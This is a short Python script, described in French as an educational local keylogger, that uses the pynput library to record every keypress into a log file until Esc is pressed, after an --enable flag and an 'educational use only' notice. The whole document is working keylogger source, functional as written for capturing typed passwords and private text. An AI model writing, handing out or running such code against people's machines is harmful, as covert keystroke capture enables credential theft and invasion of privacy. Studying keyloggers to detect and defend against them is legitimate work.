import argparse


def main() -> None:
    parser = argparse.ArgumentParser(description="Keylogger educatif (local)")
    parser.add_argument("--enable", action="store_true", help="Requis pour demarrer")
    parser.add_argument("--output", default="keys.log")
    args = parser.parse_args()

    if not args.enable:
        print("Usage educatif uniquement. Lancez avec --enable pour demarrer.")
        return

    try:
        from pynput import keyboard  # type: ignore
    except Exception:
        print("pynput requis. Installez: pip install pynput")
        return

    def on_press(key):
        with open(args.output, "a", encoding="utf-8") as handle:
            handle.write(f"{key}\n")

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
